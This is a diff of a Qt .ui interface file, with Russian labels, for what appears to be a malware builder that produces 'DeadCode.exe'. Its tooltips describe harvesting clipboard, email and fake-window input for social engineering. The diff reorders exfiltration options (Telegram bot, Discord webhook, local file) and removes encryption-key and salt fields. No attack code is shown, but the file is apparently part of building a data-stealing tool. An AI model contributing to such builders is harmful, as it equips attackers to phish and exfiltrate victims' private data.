@@ -309,7 +309,7 @@
               <string>Данные для социальной инженерии</string>
              </property>
              <property name="toolTip">
-              <string>Сбор данных для социальной инженерии: создание фейковых окон, сбор ввода</string>
+              <string>Сбор данных для социальной инженерии: буфер обмена, email, фейковые окна</string>
              </property>
             </widget>
            </item>
@@ -430,6 +430,11 @@
         <widget class="QComboBox" name="sendMethodComboBox">
          <item>
           <property name="text">
+           <string>Local File</string>
+          </property>
+         </item>
+         <item>
+          <property name="text">
            <string>Telegram</string>
           </property>
          </item>
@@ -438,16 +443,11 @@
            <string>Discord</string>
           </property>
          </item>
-         <item>
-          <property name="text">
-           <string>Local File</string>
-          </property>
-         </item>
          <property name="currentText">
           <string>Local File</string>
          </property>
          <property name="toolTip">
-          <string>Telegram: отправка через бота, Discord: через вебхук, Local File: сохранение на диск</string>
+          <string>Local File: сохранение на диск, Telegram: отправка через бота, Discord: через вебхук</string>
          </property>
         </widget>
        </item>
@@ -601,72 +601,6 @@
          </property>
          <property name="toolTip">
           <string>Введите имя выходного файла (например, DeadCode.exe)</string>
-         </property>
-        </widget>
-       </item>
-       <item row="8" column="0">
-        <widget class="QLabel" name="encryptionKey1Label">
-         <property name="text">
-          <string>Ключ шифрования 1:</string>
-         </property>
-         <property name="toolTip">
-          <string>Первый ключ шифрования для защиты данных</string>
-         </property>
-        </widget>
-       </item>
-       <item row="8" column="1">
-        <widget class="QLineEdit" name="encryptionKey1LineEdit">
-         <property name="placeholderText">
-          <string>Введите первый ключ шифрования (16 символов)</string>
-         </property>
-         <property name="toolTip">
-          <string>Введите первый ключ шифрования (16 символов)</string>
-         </property>
-         <property name="maxLength">
-          <number>16</number>
-         </property>
-        </widget>
-       </item>
-       <item row="9" column="0">
-        <widget class="QLabel" name="encryptionKey2Label">
-         <property name="text">
-          <string>Ключ шифрования 2:</string>
-         </property>
-         <property name="toolTip">
-          <string>Второй ключ шифрования для защиты данных</string>
-         </property>
-        </widget>
-       </item>
-       <item row="9" column="1">
-        <widget class="QLineEdit" name="encryptionKey2LineEdit">
-         <property name="placeholderText">
-          <string>Введите второй ключ шифрования (16 символов)</string>
-         </property>
-         <property name="toolTip">
-          <string>Введите второй ключ шифрования (16 символов)</string>
-         </property>
-         <property name="maxLength">
-          <number>16</number>
-         </property>
-        </widget>
-       </item>
-       <item row="10" column="0">
-        <widget class="QLabel" name="encryptionSaltLabel">
-         <property name="text">
-          <string>Соль шифрования:</string>
-         </property>
-         <property name="toolTip">
-          <string>Соль для усиления шифрования</string>
-         </property>
-        </widget>
-       </item>
-       <item row="10" column="1">
-        <widget class="QLineEdit" name="encryptionSaltLineEdit">
-         <property name="placeholderText">
-          <string>Введите соль шифрования</string>
-         </property>
-         <property name="toolTip">
-          <string>Введите соль для усиления шифрования</string>
          </property>
         </widget>
        </item>
